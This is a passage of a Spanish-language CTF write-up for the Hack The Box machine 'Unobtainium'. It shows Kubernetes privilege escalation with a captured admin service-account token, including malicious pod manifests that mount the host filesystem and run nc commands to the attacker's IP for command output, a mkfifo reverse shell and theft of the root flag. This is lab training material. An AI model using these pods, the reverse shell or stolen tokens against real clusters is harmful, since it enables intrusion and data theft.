<devnode>$ TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
```

Tomando algunos ejemplos (como el de [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#escaping-from-the-pod) (cambiamos a `namespace: kube-system`)) generamos nuestro archivo `.yaml` y después para validar si podemos crearlo ejecutaríamos:

```bash
<devnode>$ ./kubito apply -f aaa.yaml -n kube-system       
Error from server (Forbidden)
...
```

Pero indicándole el token:

```bash
<devnode>$ ./kubito apply -f aaa.yaml -n kube-system --token $TOKEN        
pod/attacker-pod created
```

Listoneeeeees, al parecer tenemos el token del usuario `admin`, lo que quiere decir que tenemos interacción total contra **Kubernetes**, pues ahora solo nos queda probar y probar cosas para ver con cuál logramos explotar esta locura (:

...

Después de muchas pruebas en las que no estaba pensando, solo probaba y probaba (algo sin sentido :s), frene, mire la terminal y empece a pensar sobre lo que estaba intentando crear.

Hubo varios recursos que use para probar, se los dejo por si algo:

* [Kubernetes Pentest Methodology Part 1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1).
* [Escaping from the pod](https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#escaping-from-the-pod).
* [Eight Ways to Create a Pod](https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod).
* [Bad Pods: Kubernetes Pod Privilege Escalation](https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation).
* Y otros que perdi en el camino pensando que no me servian (pero estoy casi seguro que si).

Y finalmente este:

* [Attacking Kubernetes through Kubelet](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/).

> Me quedo con este ultimo porque es sencillo de leer y además fue con el que me pare a pensar sobre que estaba haciendo y con el que finalmente logre crear cositas maliciosas...

...

## Generamos <u>POD malicioso</u> [📌](#malicious-pod) {#malicious-pod}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_access2THEnodes.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ese archivo `.yaml` genera un **pod** que cuando se crea nos devuelve una **Reverse Shell** (además de montar la raíz del sistema (`/`) en una ruta llamada `/host`).

Sencillito, nos copiamos ese texto y creamos el archivo `.yaml` con nuestros comandos, para confirmar que el sistema **host** tiene `nc`, vamos a decirle que nos envíe el resultado del comando `id` a nuestro listener:

```yml
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - name: busybox
    image: busybox:1.29.2
    command: ["/bin/sh"]
    args: ["-c", "id | nc 10.10.14.146 4435"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

Ahora le indicamos que nos cree el **pod** según el contenido del archivo `.yaml`:

```bash
<devnode>$ ./kubito -n kube-system --token $TOKEN apply -f aaa.yaml 
pod/test created
```

Validamos si se creó:

```bash
<devnode>$ ./kubito -n kube-system --token $TOKEN get pods
NAME                                  READY   STATUS             RESTARTS   AGE
...
test                                  0/1     ErrImagePull       0          6s
```

Pero hay errores, si volvemos a validar el sistema lo termina y después lo borra:

```bash
<devnode>$ ./kubito -n kube-system --token $TOKEN get pods
NAME                                  READY   STATUS             RESTARTS   AGE
...
test                                  0/1     Terminating        0          8s
```

Por lo tanto no se ejecuta nuestro comando... Acá estuve un buen rato, **probando y probando**. (Muchas pruebas e.e)

Se me dio por leer los **pods** que ya existen y comparar algunos campos con los de nuestro archivo `.yaml` a ver si era que necesitábamos algo en especial, si los listamos vemos varios:

```bash
<devnode>$ ./kubito -n kube-system --token $TOKEN get pods
NAME                                  READY   STATUS             RESTARTS   AGE
backup-pod                            0/1     CrashLoopBackOff   93         168d
coredns-74ff55c5b-sclll               1/1     Running            31         169d
etcd-unobtainium                      1/1     Running            0          117m
kube-apiserver-unobtainium            1/1     Running            0          117m
kube-controller-manager-unobtainium   1/1     Running            34         169d
kube-proxy-zqp45                      1/1     Running            31         169d
kube-scheduler-unobtainium            1/1     Running            31         169d
storage-provisioner                   1/1     Running            63         169d
```

Leyendo el contenido del primer **pod** (que esta como en algún tipo de error, pero no se borra (además su nombre el llamativo)) y comparando sus campos con los nuestros podemos copiar algún que otro contenido:

```bash
root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testea$ ./kubito -n kube-system --token $TOKEN describe pod backup-pod
Name:         backup-pod
Namespace:    kube-system
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Mon, 18 Jan 2021 16:34:56 +0000
Labels:       <none>
Annotations:  <none>
Status:       Running
IP:           172.17.0.9
IPs:
  IP:  172.17.0.9
Containers:
  backup-pod:
    Container ID:   docker://64a32a185ef0b218ddaaddb376725f3f709c7cc36b4f5872ebdf179819d189f4
    Image:          localhost:5000/dev-alpine
    Image ID:       docker-pullable://alpine@sha256:d9a7354e3845ea8466bb00b22224d9116b183e594527fb5b6c3d30bc01a20378
    Port:           <none>
    Host Port:      <none>                                                                      
    State:          Waiting         
      Reason:       CrashLoopBackOff
    Last State:     Terminated
      Reason:       Completed
      Exit Code:    0
      Started:      Mon, 05 Jul 2021 19:53:36 +0000
      Finished:     Mon, 05 Jul 2021 19:53:36 +0000
    Ready:          False
    Restart Count:  94
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-l85f2 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             False 
  ContainersReady   False 
  PodScheduled      True
Volumes:
  default-token-l85f2:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-l85f2
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:
  Type     Reason   Age                    From     Message
  ----     ------   ----                   ----     -------
  Warning  BackOff  4m4s (x532 over 118m)  kubelet  Back-off restarting failed container
```

Entre algunos cambios que hice, el que me dio resultado fue el campo `Image`, el cual vemos que es distinto al de nuestro archivo `.yaml`:

> Además vemos que ese **pod** en concreto se comunica con el sistema host `unobtainium/10.10.10.235`, eso también me llamo a atención...

**aaa.yaml**:

```yaml
image: busybox:1.29.2
```

**backup-pod**:

```yaml
image: localhost:5000/dev-alpine
```

Puede ser que nos esté generando error por eso, ya que la imagen `busybox:1.29.2` lo más probable es que no exista y por el contrario `localhost:5000/dev-alpine` si, pues copiemos esa imagen en nuestro **pod** e intentemos crearlo de nuevo:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - name: busybox
    image: localhost:5000/dev-alpine
    command: ["/bin/sh"]
    args: ["-c", "id | nc 10.10.14.146 4435"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

```bash
<devnode>$ ./kubito -n kube-system --token $TOKEN apply -f aaa.yaml 
```

Yyyy en nuestro listenerrrrrr:

![338bash_maliciousPOD_nc_id](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_maliciousPOD_nc_id.png)

Peeeeeeeerfecto, tenemos ejecución remota de comandos, pues entablémonos una reverse Shell:

```bash
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - name: busybox
    image: localhost:5000/dev-alpine
    command: ["/bin/sh"]
    args: ["-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.146 4435 >/tmp/f"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

Y ejecutamos:

```bash
<devnode>$ ./kubito -n kube-system --token $TOKEN apply -f aaa.yaml 
```

Y ahora en nuestro listener:

![338bash_maliciousPOD_revsh](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_maliciousPOD_revsh.png)

Pero la perdemos muy rápido (a la vez que se borra el **pod**), pero podemos aprovecharnos de la carpeta `/host` que crea el **pod** para leer la flag:

(Podemos obtener una Shell constante de varias formas, ya es cuestión de su imaginación)

```yaml
...
    args: ["-c", "cat /host/root/root.txt | nc 10.10.14.146 4435"]
...
```

Recibimos:

![338flags_root](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338flags_root.png)

Intente algunas formas de conseguir una **Shell** sin que se nos cierre pero no lo logre :( 

Veamos la flag de `user.txt`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338flags_user.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

Vaya locura de máquina, me encanto la explotación inicial, el juntar las dos vulnerabilidades para obtener un solo resultado, increíble, muy lindo :3 La parte de **Kubernetes** fue una locura, mucho movimiento lateral.

Bonita y entretenida máquina, aprendimos bastante y reforzamos cositas que sabíamos...

Bueno, no siendo más, muchas gracias por siempre aguantar :* Nos leeremos después yyyyy A SEGUIR ROMPIENDO TODOOOOOOOOOOOOO!!